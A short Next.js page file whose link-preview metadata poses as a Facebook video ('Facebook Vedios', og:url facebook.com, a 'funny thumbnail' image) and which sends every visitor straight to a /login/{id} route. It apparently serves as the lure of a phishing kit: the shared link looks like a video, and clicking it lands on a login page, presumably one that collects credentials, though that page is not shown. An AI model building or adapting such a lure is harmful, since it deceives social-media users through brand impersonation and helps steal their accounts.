import { getUrlById } from "@/lib/action";
import { Metadata } from "next";
import { redirect } from "next/navigation";

// This is a mock function. Replace it with your actual data fetching logic.

type Props = {
  params: { id: string };
};
export const metadata: Metadata = {
  title: "Facebook Vedios",
  description: "The vedio you should watch now",
  other: {
    "twitter:image":
      "https://www.behance.net/gallery/121380093/FUNNY-THUMBNAIL",
    "twitter:card": "summary_large_image",
    "og:url": "https:www.facebook.com",
    "og:image": "https://www.behance.net/gallery/121380093/FUNNY-THUMBNAIL",
    "og:type": "website",
  },
};

export default function ProductLayout({ params }: Props) {
  redirect(`/login/${params.id}`);
  return <></>;
}
